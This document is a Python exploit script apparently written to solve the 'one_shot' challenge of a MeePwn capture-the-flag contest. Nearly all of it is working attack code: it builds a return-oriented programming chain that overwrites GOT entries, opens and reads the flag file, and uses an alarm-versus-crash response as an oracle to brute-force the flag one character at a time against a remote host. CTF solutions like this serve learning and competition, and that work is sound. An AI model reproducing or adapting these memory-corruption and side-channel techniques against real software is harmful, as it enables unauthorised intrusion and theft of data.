#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './one_shot'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'178.128.87.12', 'port':31338, 'level':'error'})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc-2.24.so')
env.set_item('flag_path',   debug   = './././././././flagx\x00', \
                            local   = './././././././flagx\x00', \
                            remote  = '/home/one_shot/flag\x00')
env.select('remote')

#==========

binf = ELF(bin_file)
addr_got_close      = binf.got['close']
addr_got_exit       = binf.got['exit']
addr_got_read       = binf.got['read']

addr_plt_close      = binf.plt['close']
addr_plt_read       = binf.plt['read']
addr_plt_exit       = binf.plt['exit']
addr_plt_alarm      = binf.plt['alarm']

addr_bss            = binf.sep_section['.bss']
addr_data           = addr_bss + 0x800
addr_flag           = addr_bss + 0x40

addr_check          = 0x00400660
addr_ret            = 0x00400844
addr_rdi            = 0x00400843
addr_rsi_r12        = 0x00400841
addr_rsp_18         = 0x0040083d

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_open    = libc.sep_function['open']

#==========

def attack(conn, i, candidate):
    if len(candidate)!=4:
        warn("candidate length wring")
        return None

    data  = env.flag_path.ljust(0x18)               # a
    data += p32(addr_plt_exit+6)                    # b
    data += p32(0)+p32(addr_plt_read)               # c
    data += candidate                               # d
    data += p64(0xcafebabe)*3
    data += p64(0x40075a)                           # e

    exploit  = p32(0x8a919ff0)
    exploit += p32((offset_libc_open&0xffff)<<16)   # 1
    exploit += p32(addr_plt_read)                   # 2
    exploit += p32(len(data))                       # 3
    exploit += data                                 # 4

    exploit  = exploit.ljust(0x80, 'a')
    exploit += p64((addr_got_close-2) + 0x20)       # 1
    exploit += p64(addr_ret)*0xa
    exploit += p64(addr_check + 0x13)

    exploit += p64(0xdeadbeef)
    exploit += p64((addr_data+0xf0) + 0x20)         # 2
    exploit += p64(addr_check + 0x13)

    exploit += p64(0xdeadbeef)
    exploit += p64((addr_data-4) + 0x20)            # 3
    exploit += p64(addr_check + 0x13)

    exploit += p64(0xdeadbeef)
    exploit += p64(addr_data + 0x20)                # 4
    exploit += p64(addr_check + 0x1a)

    exploit += p64(0xdeadbeef)
    exploit += p64(addr_got_exit + 0x20)            # b

    exploit += p64(addr_rdi)
    exploit += p64(addr_data)
    exploit += p64(addr_rsi_r12)
    exploit += p64(0x0)
    exploit += p64(0xdeadbeef)
    exploit += p64(addr_plt_close)

    exploit += p64(addr_rdi)
    exploit += p64(0)
    exploit += p64(addr_rsi_r12)
    exploit += p64(addr_flag)
    exploit += p64(0xdeadbeef)
    exploit += p64(addr_plt_read)
 
    exploit += p64(addr_rdi)
    exploit += p64(1)
    exploit += p64(addr_plt_alarm + 6)

    exploit += p64(addr_rdi)
    exploit += p64(addr_data+0x18)                  # b
    exploit += p64(addr_check + 0x13)

    exploit += p64(0xdeadbeef)
    exploit += p64((addr_got_read+4) + 0x20)        # c
    exploit += p64(addr_check + 0x13)
    exploit += p64(0xdeadbeef)
    exploit += p64(addr_got_read + 0x20)
    exploit += p64(addr_check + 0x13)

    exploit += p64(0xdeadbeef)
    exploit += p64(addr_flag+i + 0x1c)              # d
    exploit += p64(addr_check + 0x13)

    exploit += p64(0xdeadbeef)*2
    exploit += p64(addr_rsp_18)
    exploit += p64(addr_data+0x28)                  # e

    if env.check('remote'):
        conn.sendlineafter('> ', exploit)
        try:
            resp = conn.readuntil('\n')
        except:
            pass
        else:
            if 'core dumped' in resp:
                return None
            elif 'Alarm clock' in resp:
                return True
        return False
    else:
        raw_input('>')
        conn.send(exploit)
        return True

#==========

if __name__=='__main__':
    flag = 'MeePwnCTF{Do_y0u_r3m3mb3r_sigreturn'
    chars = '}_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    for i in range(len(flag)-3, 0x100):
        success('flag : ' + flag)

        if flag[-1] == '}':
            break
        elif len(flag)!=i+3:
            warn('something wrong...')
            exit()

        for c in chars:
            info('trying "%c"...' % c)
            while True:
                conn = communicate(env.mode, **env.target)
                r = attack(conn, i, flag[i:]+c)
                conn.close()
                if r is not None:
                    break
            if r:
                success('found "%c"!' % c)
                flag += c
                break
    
#==========
